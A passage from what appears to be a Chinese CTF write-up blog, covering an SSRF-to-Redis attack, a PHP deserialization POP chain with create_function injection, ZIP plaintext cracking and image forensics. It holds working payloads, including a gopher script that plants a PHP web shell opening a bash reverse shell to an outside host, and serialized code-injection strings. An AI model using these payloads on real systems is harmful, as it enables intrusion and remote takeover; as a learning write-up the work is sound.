&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行test.java可以得到一个新文件exp<br>在当前目录新建一个python文件，将exp读取并发出</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br><br>url = <span class="hljs-string">&#x27;http://47.94.9.17:18387/hello/hello-servlet&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br><span class="hljs-built_in">exp</span> = f.<span class="hljs-built_in">read</span>()<br>r = requests.<span class="hljs-built_in">post</span>(url = url,data=<span class="hljs-built_in">exp</span>)<br>print r.content<br></code></pre></td></tr></table></figure><p><img src="http://81.70.101.23:11111/i/2022/04/18/j5i3io_0.png"></p><p>Flag：flag{318bf80bd83fe1f19d4b2cd3d7b53afd}</p><h2 id="Web-easyssrf-build"><a href="#Web-easyssrf-build" class="headerlink" title="Web-easyssrf (build)"></a>Web-easyssrf (build)</h2><p>html代码提示b1ub1u.php<br> <img src="http://81.70.101.23:11111/i/2022/04/18/krxerm_0.png"></p><p>传入?info&#x3D;1访问phpinfo<br>得到关键信息：内网ip为172.19.0.3<br> <img src="http://81.70.101.23:11111/i/2022/04/18/krxf48_0.png"></p><p>传入?url&#x3D;<a href="http://www.baidu.com/">www.baidu.com</a> 可以确定SSRF<br>过滤了localhost、127.0.0.1、file协议、dict协议<br>我们可以用172.19.0.X、gopher协议、http协议<br>通过burp探测该网段上存活的主机<br> <img src="http://81.70.101.23:11111/i/2022/04/18/krxk4c_0.png"><br>有172.19.0.1，172.19.0.2，172.19.0.3<br>其中172.19.0.2回显了Go away;Go away;Quickly Give me Go away<br>然后通过爆破来探测172.19.0.2开放的端口，可以看到开放了80和6378端口</p><p> <img src="http://81.70.101.23:11111/i/2022/04/18/krxew4_0.png"></p><p>根据回显信息猜测恶6378启用了redis服务并且无密码<br>尝试用gopher协议下马来攻击未授权redis<br>用脚本或者github上的工具gopher-master都可以写payload<br>由于172.19.0.2的80端口开放了http服务，可以尝试在&#x2F;var&#x2F;www&#x2F;html目录下马<br>发现不行，这里可以扫描html目录下的目录，发现有个upload目录<br><img src="http://81.70.101.23:11111/i/2022/04/18/krxnlo_0.png"></p><p>尝试在&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;目录下种马</p><p>附上写payload的脚本</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import urllib<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span><br>ip=<span class="hljs-string">&quot;172.19.0.2&quot;</span><br>port=<span class="hljs-string">&quot;6378&quot;</span><br><span class="hljs-built_in">shell</span>=<span class="hljs-string">&quot;\n\n&lt;?php system(\&quot;bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/81.70.101.23/6666 0&gt;&amp;1&#x27;\&quot;);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;b1ub1u.php&quot;</span><br>path=<span class="hljs-string">&quot;/var/www/html/upload&quot;</span><br>passwd=<span class="hljs-string">&quot;&quot;</span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>    <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">shell</span>.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>    <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>    <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>    <span class="hljs-string">&quot;save&quot;</span><br>    ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br>def redis_format(arr):<br>    <span class="hljs-literal">CRLF</span>=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+str(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=<span class="hljs-literal">CRLF</span>+<span class="hljs-string">&quot;$&quot;</span>+str(<span class="hljs-built_in">len</span>((x.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+<span class="hljs-literal">CRLF</span>+x.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=<span class="hljs-literal">CRLF</span><br>    <span class="hljs-literal">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.<span class="hljs-literal">quote</span>(redis_format(x))<br>print payload<br></code></pre></td></tr></table></figure><p>得到payload：<br><code>gopher://172.19.0.2:6378/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2480%0D%0A%0A%0A%3C%3Fphp%20system%28%22bash%20-c%20%27exec%20bash%20-i%20%3E%26%20/dev/tcp/81.70.101.23/6666%200%3E%261%27%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2420%0D%0A/var/www/html/upload%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2410%0D%0Ab1ub1u.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</code></p><p>二次编码后发出<br>vps监听端口<br>然后访问?url&#x3D;172.19.0.2&#x2F;upload&#x2F;b1ub1u.php<br>就能反弹到shell了<br><img src="http://81.70.101.23:11111/i/2022/04/18/krxsfr_0.png"></p><p>Flag：flag{shit~bro!What_a_beautiful_hacking_process!}</p><h2 id="Web-wowwow-复现"><a href="#Web-wowwow-复现" class="headerlink" title="Web-wowwow (复现)"></a>Web-wowwow (复现)</h2><p>先鸽一下啧啧啧</p><h2 id="Real-World-RealWorld"><a href="#Real-World-RealWorld" class="headerlink" title="Real World-RealWorld"></a>Real World-RealWorld</h2><p>题目是neuq某协会的oj平台<br>不方便透漏具体解题步骤了，原理是题目代码可以任意执行，可以用来反弹shell<br><img src="http://81.70.101.23:11111/i/2022/04/18/nzgocb_0.png"></p><h2 id="Misc-拼图游戏"><a href="#Misc-拼图游戏" class="headerlink" title="Misc-拼图游戏"></a>Misc-拼图游戏</h2><p>首先是将100张图片拼成一张图片<br>脚本如下</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs processing">from PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> os<br><br>i,j = <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>imax,jmax = <span class="hljs-number">10</span>,<span class="hljs-number">10</span><br><br>im = Image.<span class="hljs-property">open</span>(<span class="hljs-string">&quot;1bf376.png&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-built_in">width</span>,<span class="hljs-built_in">height</span> = im.<span class="hljs-property">size</span><br>big_img = Image.<span class="hljs-property">new</span>(<span class="hljs-string">&quot;RGB&quot;</span>,(imax*<span class="hljs-built_in">width</span>,jmax*<span class="hljs-built_in">height</span>))<br><br>dirs = os.<span class="hljs-property">listdir</span>(<span class="hljs-string">&#x27;./&#x27;</span>)<br><br><span class="hljs-keyword">for</span> k in dirs:<br>    <span class="hljs-keyword">if</span>(k.<span class="hljs-property">endswith</span>(<span class="hljs-string">&#x27;png&#x27;</span>)):<br>        # do something<br>        curim = Image.<span class="hljs-property">open</span>(k,<span class="hljs-string">&#x27;r&#x27;</span>)<br>        region = curim.<span class="hljs-property">crop</span>((<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">width</span>,<span class="hljs-built_in">height</span>))<br>        big_img.<span class="hljs-property">paste</span>(region,(i*<span class="hljs-built_in">width</span>,j*<span class="hljs-built_in">height</span>),None)<br>        # next pointer<br>        j += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> j == jmax :<br>            i += <span class="hljs-number">1</span><br>            j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><br>big_img.<span class="hljs-property">show</span>()<br>big_img.<span class="hljs-property">save</span>(<span class="hljs-string">&quot;out.png&quot;</span>,<span class="hljs-string">&#x27;png&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>然后使用gaps工具将图片间重组<br><img src="http://81.70.101.23:11111/i/2022/04/18/nwmonx_0.png"></p><p>观察数据应该是zip压缩包，在头部补充50 4B 03 04<br>压缩包解压后base85解密，再摩斯码解密，得到flag</p><p>Flag：flag{ae86673d4848fac7e0a3a243edfc0f26}</p><h2 id="Misc-两部分的flag-build"><a href="#Misc-两部分的flag-build" class="headerlink" title="Misc-两部分的flag (build)"></a>Misc-两部分的flag (build)</h2><p>解题方法：zlib解压+bkcrack明文攻击深入利用</p><p>题目开始很简单，一开始zlib的数据头没有改动，如果改动了binwalk检测不出来，只能用010editor一节节的看，就有点难了。<br> <img src="http://81.70.101.23:11111/i/2022/04/18/o142km_0.png"><br>这里binwalk可以看到多出一段default compression<br>zsteg可以直接将这段数据提取出来了，也可以用16进制编辑器复制下来</p><p>用pngcheck也可以看出有段IDAT数据是错的，根据789C可以判断是zlib出错<br> <img src="http://81.70.101.23:11111/i/2022/04/18/o14231_0.png"></p><p>对zlib数据解压，这里脚本很多，因为2018年ciscn的一道misc就是这种<br>先对十六进制数据unhexlify，再decompress解压数据，可以看到是base64格式，再b64decode解码，最后将数据装入一个文件中就得到了zip文件，脚本如下</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 1c">import zlib<br>import binascii<br>import base64<br><br>id = &#x27;789c858d4b0f<span class="hljs-number">82301084</span>7f<span class="hljs-number">1246</span>6b<span class="hljs-number">2207</span>0fbbbc040b69cb43e80d<span class="hljs-number">141542416382</span>f8efb<span class="hljs-number">5898</span>fa393cd97d9cd<span class="hljs-number">662675</span>6e<span class="hljs-number">36220778</span>0d<span class="hljs-number">5857</span>b3ed842d<span class="hljs-number">57954141</span>ef1ae06b<span class="hljs-number">4835</span>9de<span class="hljs-number">5633</span>9ab37b1d1b06ab<span class="hljs-number">7818</span>b8cca70aef<span class="hljs-number">2912</span>eaca4e747db04c682fcde784e38b9ddcd2c<span class="hljs-number">7146</span>c<span class="hljs-number">620145</span>dddb<span class="hljs-number">419891</span>a<span class="hljs-number">11754881</span>fb06fcebb<span class="hljs-number">3387</span>ce47f1daaca737bda0b<span class="hljs-number">7280</span>e177e<span class="hljs-number">750809</span>f4c6a4a<span class="hljs-number">77697442759261</span>260e7c0eee96ecd98aa<span class="hljs-number">44601195</span>2e4c5e71fc11d745efc4e583f<span class="hljs-number">0153</span>f34de3&#x27;<br>result = binascii.unhexlify(id)<br>print(result)<br>result = zlib.decompress(result)<br>print(result)<br>result = base64.b64decode(result)<br>print(result)<br>fount = open(r<span class="hljs-string">&quot;flag.zip&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<span class="hljs-comment">//将数据写入flag.zip</span><br>fount.write(result)<br>fount.close()<br></code></pre></td></tr></table></figure><p>打开flag.zip，就是flag.txt<br>这里不是伪加密也爆破不出来，因为密码是20位字母+数字+特殊字符<br>用7z打开可以看到详细信息<br> <img src="http://81.70.101.23:11111/i/2022/04/18/o141m6_0.png"></p><p>可以看到算法是ZipCrypto Store<br>这种算法不如AES256安全，可以进行明文攻击</p><p>一般明文攻击需要压缩包内有已知文件，而明文攻击深入利用只需要8+4一共12个字节就可以爆破出来，结合题目“两部分的flag”，第一部分flag{y0u正好是8个字节，第二部分我选择plaintext一方面9个字节可以加快爆破速度，另一方面可以提示明文攻击。</p><p>题目描述里的*对应数量，plaintext偏移量可以数出来是21<br>接下来就是爆破了，大概22分钟就能跑出来了<br>可以爆破出三段密钥：48968f07  fe22a0fd  8aea9d7e<br>直接根据密钥用bkcrack或者ARCHPR都可以得到flag.txt<br> <img src="http://81.70.101.23:11111/i/2022/04/18/o1465f_0.png"></p><p>拿到密钥后也可以用ARCHPR输入三段密钥，选择“使用这些密钥解密ZIP档案文件”<br>就可以得到解密后的ZIP文件<br><img src="http://81.70.101.23:11111/i/2022/04/18/o1491a_0.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF Sept X 浙江工业大学 题目复现</title>
    <link href="/2022/03/29/DASCTF%20Sept%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%20%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/03/29/DASCTF%20Sept%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%20%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛的web题目大部分是跟反序列化相关的，真难啃</p><h2 id="Web-hellounser"><a href="#Web-hellounser" class="headerlink" title="Web-hellounser"></a>Web-hellounser</h2><p>虽然是条简单的pop链，但我没做过几道这类构造pop链的题目，啧</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;                                   <span class="hljs-comment">//第一部分</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;                                    <span class="hljs-comment">//第二部分</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable language_">$this</span>-&gt;func) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="hljs-variable language_">$this</span>-&gt;arg)) &#123; <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No!No!No!&#x27;</span>); <br>        &#125; <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>            <span class="hljs-comment">//There is no code to print flag in flag.php</span><br>            <span class="hljs-variable">$func</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable language_">$this</span>-&gt;arg);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-string">&quot;Nice Job!!&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <br>    <br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;                    <span class="hljs-comment">//第三部分</span><br>    <span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>    <span class="hljs-variable">$aaa</span>();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h3><p>首先肯定是想调用class B中的show方法，来include “flag.php”<br>注释说flag.php里打印不出flag，那么估计是要用下一句的<code>$func(&#39;&#39;, $this-&gt;arg);</code>，等会分析<br>在class B里，__toString方法调用了我们想要的show方法，而__toString是我们可以尝试利用的魔术方法<br><code>__toString 当一个对象被当作一个字符串被调用。</code><br>结合前面class A里面有个字符串$var，可以尝试把$var赋值成class B的对象</p><p>第三部分，有一个<code>$aaa();</code>，而$aaa是反序列化后的pop，即一个对象，所以<code>$aaa();</code>就满足了__invoke魔术方法的条件<br><code>__invoke() 当脚本尝试将对象调用为函数时触发</code><br>所以如果$aaa是class A的对象，触发了__invoke魔术方法，调用了class A里的show方法，echo出$var</p><p>这样就两个class A和B就通过$var连接起来了</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>可以分三部分部分：一部分是正则，一部分是<code>$func(&#39;&#39;, $this-&gt;arg);</code>，还有一部分用于绕过函数过滤</p><h4 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h4><p>对func的正则<code>/^[a-z0-9]*$/isD</code>，意思是func不能全是字母数字(不分大小写)，所以要包括特殊字符<br>记不住的可以用嗨正则来在线解析<br><img src="http://81.70.101.23:11111/i/2022/03/31/qsiz7x_0.png"><br>对arg的正则就是过滤了一些函数和字符(不分大小写)</p><h4 id="func-39-39-this-gt-arg"><a href="#func-39-39-this-gt-arg" class="headerlink" title="$func(&#39;&#39;, $this-&gt;arg);"></a><code>$func(&#39;&#39;, $this-&gt;arg);</code></h4><p>从要包含特殊字符来下手，可以找到漏洞函数<code>create_function()</code><br>官方解释：<br>create_function()主要用来创建匿名函数,有时候匿名函数可以发挥它的作用。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">string</span> create_function(<span class="hljs-built_in">string</span> $args,<span class="hljs-built_in">string</span> $code)           //<span class="hljs-built_in">string</span> $args-&gt;变量部分 <span class="hljs-built_in">string</span> $code-&gt;方法代码部分<br></code></pre></td></tr></table></figure><p>比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;New anonymous function: <span class="hljs-subst">$newfunc</span>\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$newfunc</span>(<span class="hljs-number">2</span>, M_E) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以创建出类似这样的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda_1</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ln(<span class="hljs-subst">$a</span>) + ln(<span class="hljs-subst">$b</span>) = &quot;</span> . <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$a</span> * <span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>里面内置了类似eval的功能，可以让代码任意执行，我们可以将}与前面闭合，后面写入新的函数，最后用&#x2F;&#x2F;注释掉最后的}和?&gt;<br>所以漏洞模板为<code>&#125;任意代码;//</code></p><h4 id="绕过函数过滤"><a href="#绕过函数过滤" class="headerlink" title="绕过函数过滤"></a>绕过函数过滤</h4><p>过滤的仍有余地：没有过滤base64相关函数、require、var_dump、system，还有一个不常用的get_defined_vars()<br><code>get_defined_vars()</code>的意思是’返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量’。<br>提到这个函数是因为后面真正的flag在php文件中只是被定义的一个变量，要输出可以用get_defined_vars()或者php伪协议。</p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;func=<span class="hljs-string">&quot;create_function&quot;</span>;<br><span class="hljs-variable">$b</span>-&gt;arg=<span class="hljs-string">&#x27;&#125;system(ls);//&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="http://81.70.101.23:11111/i/2022/03/31/qsiylw_0.png"><br>传入<code>?pop=O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:15:&quot;create_function&quot;;s:3:&quot;arg&quot;;s:14:&quot;&#125;system(ls);//&quot;;&#125;&#125;</code><br><img src="http://81.70.101.23:11111/i/2022/03/31/qsj691_0.png"><br>然后用require(base64_decode(VHJ1M2ZsYWcucGhw))代替cat Tru3flag.php<br>传入<code>?pop=O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:15:&quot;create_function&quot;;s:3:&quot;arg&quot;;s:73:&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;;&#125;&#125;</code><br><img src="http://81.70.101.23:11111/i/2022/03/31/qsj7g8_0.png"></p><p>还有一种取反加php伪协议来做的，还不是特别懂，先鸽一下吧….</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$tmp</span>=<span class="hljs-variable">$ac</span>=(~(<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=Tru3flag.php&#x27;</span>));<br><span 